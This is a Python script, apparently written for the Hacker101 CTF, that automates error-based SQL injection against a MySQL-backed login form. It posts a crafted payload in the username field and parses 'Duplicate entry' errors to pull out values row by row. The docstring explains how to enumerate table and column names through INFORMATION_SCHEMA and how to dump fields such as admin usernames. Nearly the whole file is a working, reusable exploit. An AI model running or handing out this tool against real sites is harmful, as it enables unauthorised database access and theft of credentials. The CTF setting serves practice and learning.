"""
SQL Injection-based Database Traversal

Utilizes error-based SQL injections to extract columns of data from database.
Regex PATTERN for extracting values from error messages only works with MySQL databases (eg. Duplicate entry 'VALUE#1' for key 'group_key').
Sends POST request with payload to URL.

To use:
Set COLUMN and TABLE to column and table to extract values from.
Set MAX_ROWS to number of values to extract before quitting (program quits earlier if it reaches end of column).
Set URL to url to send POST request to.
Set POST_PARAMETERS to parameters normally sent in POST request (ex. username, password).
Set POST_INJECTION_PARAMETER_NAME to parameter to insert payload into.
If only values from rows meeting a certain condition should be extracted (ex. WHERE table_name='foo'), uncomment WHERE clause in PAYLOAD_BASE and modify accordingly.

Examples:
To find table names:
Set COLUMN to TABLE_NAME and TABLE to INFORMATION_SCHEMA.TABLES

To find column names in specific table:
Set COLUMN to COLUMN_NAME, TABLE to INFORMATION_SCHEMA.COLUMNS, uncomment WHERE clause in PAYLOAD_BASE, and set it to "WHERE TABLE_NAME='[table to extract columns from]'"


Can be tested in Micro-CMS v2 challenge from Hacker101 CTF (https://ctf.hacker101.com/ctf) by setting URL to "[CMS challenge url]/login".
"""

import requests, os, re

COLUMN = "username"
TABLE = "admins"
MAX_ROWS = 99

URL = ""
POST_PARAMETERS = {
    "username": '',
    "password": ''
}
POST_INJECTION_PARAMETER_NAME = "username"
# Payload Credit: https://pentest-tools.com/blog/sql-injection-attacks/
PAYLOAD_BASE = (
    "0\' AND (SELECT 0 FROM (SELECT count(*), CONCAT((SELECT {col} FROM {tab}"
    #" WHERE table_name='admins'"
    " LIMIT 1 OFFSET {num}), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) - - \'"
)

PATTERN = r"Duplicate entry \'(.*)#[0-9]*\' for key \'group_key\'"

def post(parameters):
    return requests.post(URL, parameters)

def retrieveName(text):
    m = re.search(PATTERN, text)
    if m is not None:
        return m.group(1)
    else:
        return None

def inject(payload):
    names = []
    parameters = POST_PARAMETERS.copy()
    for i in range(MAX_ROWS):
        parameters[POST_INJECTION_PARAMETER_NAME] = payload.format(num = i)
        page = post(parameters)
        name = retrieveName(page.text)
        if name is None:
            break
        names.append(name)
        print(name)
        print(payload)
    return names

def main():
    names = inject(PAYLOAD_BASE.format(col = COLUMN, tab = TABLE, num = "{num}"))
    print(names)
    os.system("pause")

if __name__  == "__main__":
    main()
